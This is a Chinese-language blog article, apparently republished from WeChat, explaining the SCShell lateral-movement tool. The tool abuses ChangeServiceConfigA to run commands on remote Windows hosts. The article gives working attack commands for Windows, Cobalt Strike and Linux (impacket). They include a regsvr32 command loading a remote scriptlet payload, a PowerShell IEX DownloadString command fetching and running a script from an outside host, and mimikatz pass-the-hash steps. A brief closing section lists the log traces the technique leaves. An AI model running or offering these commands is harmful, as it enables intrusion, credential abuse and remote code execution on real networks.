> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BfO5hpoAiwXLpVOD3uj-zQ)

**1. 简单介绍**

SCShell 是无文件横向移动工具，它依赖 ChangeServiceConfigA 来运行命令。该工具的优点在于它不会针对 SMB 执行身份验证。一切都通过 DCERPC 执行。无需创建服务，而只需通过 ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。支持 py 和 exe 两种文件类型。

该实用程序可以在不注册服务或创建服务的情况下远程使用。它也不必在远程系统上删除任何文件 *（取决于用于执行的技术）

一切都通过 DCERPC 执行。执行完成后，服务二进制路径将还原为原始路径

**2. 技术细节**

首先，它创建身份验证，这个工具是使用 LogonUserA API 和 ImpersonateLoggedOnUserA 实现的。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibgvTQURYKGgruOmWAVbJknDdpqjvRibZdApoITv49xFMibR1B5tXbEgvw/640?wx_fmt=jpeg)

一旦进程获取了正确的身份验证，即可使用 OpenSCManagerA 远程打开目标主机上 Service Manager 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKib8QictoYxicZm3u2wIk0ibYZtiaOFQNTf7O3wQn3ibtdyEJjXiahpRO6Y2PhQ/640?wx_fmt=jpeg)

使用 OpenServiceA API 打开远程服务并抛出错误

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibnSV1kNTr43y5DEZibgT3ud8LFQYlB5oRyadBNxputDIYqqNWj3E68OA/640?wx_fmt=jpeg)

往下看是通过调用 ChangeServiceConfigA API 可以实现代码执行的效果。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKib2stSl7BS0e3gibMItfr2IKCFHhicyIiaMaDWHBaicprZS7Jo5q0XMadiblg/640?wx_fmt=jpeg)

通过查看微软文档我们可以知道 API 的第五个参数是用于启动服务的二进制路径

```
BOOL ChangeServiceConfig(
 SC_HANDLE hService      // 打开服务时返回的句柄
 DWORD dwServiceType,    // 服务的类型
 DWORD dwStartType,      // 何时启动服务
 DWORD dwErrorControl, // 错误控制代码
 LPCTSTR lpBinaryPathName, // 服务的路径
 LPCTSTR lpLoadOrderGroup, // 服务所属的组
 LPDWORD lpdwTagId,      // 服务的标记
 LPCTSTR lpDependencies,     // 依赖的其它服务和组
 LPCTSTR lpServiceStartName,// 服务的启动用户
 LPCTSTR lpPassword,     //服务启动用户的密码
 LPCTSTR lpDisplayName       // 服务的显示名
);
https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfiga
```

所以作者在第 5 个参数设置了个 payload 值，也就是给我们输入的值。这个路径的是绝对路径，这里不多说，可以参考微软的文档。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibQfuQbRKczWiaDXdgfRNhbDPaIKY9K0KKsrnde91wkUibCpuuM3ekSd9g/640?wx_fmt=png)

那么上面的代码就是调用 ChangeServiceConfigA 来将二进制路径名设置为我们提供的有效负载（就是执行我们的 lpBinaryPathName 中的值,）

可利用点就是在这个位置，原理不难理解，就是 ChangeServiceConfigA API 中的 lpBinaryPathName 的值可控。

例如调用 powershell 来远程加载木马或执行命令等等。

最后就是通过 StartServiceA 启动服务。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKiboVXyBvdLdPwjE8niczPHXdVe0eZzl3jW4MVYK8ia1p7gcvzzeF795GtQ/640?wx_fmt=jpeg)

代码不难理解。

**3. 利用手法**

作者给出的利用工具有包含 exe,py 和一个 c 语言的源码，其中 exe 和 py 能实现的功能并不一样。其实我个人觉得 exe 和 py 并不是很好用，所以 powershell 进行远程加载利用的话，我们就不用上传一个 exe 上去。后面花点时间写出来吧。

**1. Windows 使用**

Scshell 需要以下参数：目标，服务，有效负载，用户名，账号，密码：

```
1.SCShell.exe 192.168.197.131XblAuthManager"C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll". administrastor Password
# XblAuthManager 是 Xbox Accessory Management Service的服务名
```

**例子：**

我们使用这种手法来在目标主机中写入一个 txt 来证明可以利用

**在 win 中** 

```
scshell.exe 10.10.10.10 defragsvc "C:\windows\system32\cmd.exe /c echo ' hello' > c:\windows\temp\lat2.txt" . administrator 1qaz@wsx
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibsicRkwu5vLWegLk14zDvqAK3rxNm453NxOlDEy7uDBPv7B8GTAkFKHQ/640?wx_fmt=png)  

在目标机器中我们可以看到写入一个 txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibnwWaia90dh3sPYAffN0mhWFnCeOQBib9xgOL4PF9e78WNFt1Om3beQQQ/640?wx_fmt=png)

在 cobalt Strike 中

```
shell .\scshell.exe 10.10.10.10 defragsvc "C:\windows\system32\cmd.exe /c echo ' hello' > c:\windows\temp\lat2.txt" . administrator 1qaz@wsx
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibEIkicXcXfyicmpepWvAkXSsAyyg2pCX04q7rUZph0HV5ib2GMQh6dA7Uw/640?wx_fmt=jpeg)  

**2. Linux 安装使用（使用 py 脚本可以使用散列传递来执行相同的横向移动。）**

```
1.pip install impacket
2.git clone https://github.com/Mr-Un1k0d3r/SCShell
3.cd https://github.com/Mr-Un1k0d3r/SCShell
4.python scshell.py ./administrator:cxzcxz@192.168.52.133# 执行cmd模式，没有命令回显
5.python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce # hash验证
```

注意：无论是使用 exe 还是 py 脚本都是没有回显的。

**3. 可以使用该 C 程序传递哈希值。**

有时情况下，将使用当前进程令牌。您可以使用标准传递哈希方法设置当前流程令牌。

在本地系统上

```
sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe
```

然后在新创建的 cmd.exe 中运行 SCShell.exe 进行横向。  

上面我们使用的是 XblAuthManager，其实我们还可以使用 defragsvc，msbuild 等等

**4. 实战思路**

这个不用多说了吧，简单就是远程调用 powershell 远程加载 ps1 上线，或执行一些命令。

```
shell scshell.exe 10.10.10.10 defragsvc "C:\windows\system32\cmd.exe /c powershell.exe IEX(New-Object Net.WebClinet).DownloadString('http://192.168.50.146:8000/123.ps1')" . administrator 1qaz@wsx
```

然后还有就是 exe 的话需要我们有目标主机的明文密码，但是，明文密码不好拿到，所以还是使用 py 脚本来传输 hash 进行横向好，当然后面我也会写一个 powershell 的出来。  

从原理出发，举一反三就好

**5. 日志痕迹**

使用用户凭证连接会在目标日志系统留下用户名、来访机器 IP 和服务超时等信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibBScKxBdDe1yJeklh34aAibdria8ffSXvthiaT4vo8DWNeRgUr2sBvY8Kg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBCNWibMYYJO6XHovIrEChKibH1Fkj3EXkKtd0kERHZic0VHr2nlK0vYyKMkRGnRYib1RLv6KibCUOCUSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCu9vYaicsKXmibIlxHDeXmK8yoDsVrSMpI3RgS4JPtgGPdqXToibeNYGEMgk5WznIayx4hwMd8sVgJA/640?wx_fmt=jpeg)